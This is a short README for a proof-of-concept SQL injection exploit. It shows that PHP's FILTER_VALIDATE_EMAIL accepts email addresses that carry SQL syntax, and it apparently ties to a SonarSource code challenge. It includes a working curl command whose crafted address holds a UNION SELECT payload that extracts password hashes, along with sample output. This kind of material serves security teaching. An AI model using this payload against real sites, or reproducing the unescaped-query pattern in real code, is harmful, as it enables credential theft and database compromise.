# PHP filter_var() Bypass & SQL Injection PoC
This repository contains a proof-of-concept (PoC) exploit for a SQL Injection vulnerability caused by improper use of PHP's filter_var() function. The vulnerability arises because FILTER_VALIDATE_EMAIL allows certain special characters, enabling an attacker to inject SQL statements through a crafted email address.


# Vulnerability Details
- The application attempts to validate user-provided email input using filter_var() with multiple filters.
- However, FILTER_VALIDATE_EMAIL only checks the format and does not sanitize the input.
- Certain special characters allowed by RFC 822 in email addresses can be used for SQL Injection.
- The validated email is then directly inserted into an SQL query, making it possible to manipulate the database.

# Exploit Scenario
An attacker can:
- Submit a specially crafted email containing an SQL injection payload.
- Bypass validation since FILTER_VALIDATE_EMAIL does not block dangerous SQL syntax.
- Extract sensitive information such as user credentials using a UNION SQL Injection attack.


# Exploit Usage

```sh
curl -X POST "http://vulnerable-site.com/login.php" -d "mail='/**/UNION/**/SELECT/**/password/**/FROM/**/users/*'@exploit.com"
```
```sh
Hello hashed_password_from_database we sent you an email ;).
```

## References
https://www.sonarsource.com/knowledge/code-challenges/advent-calendar-2022/
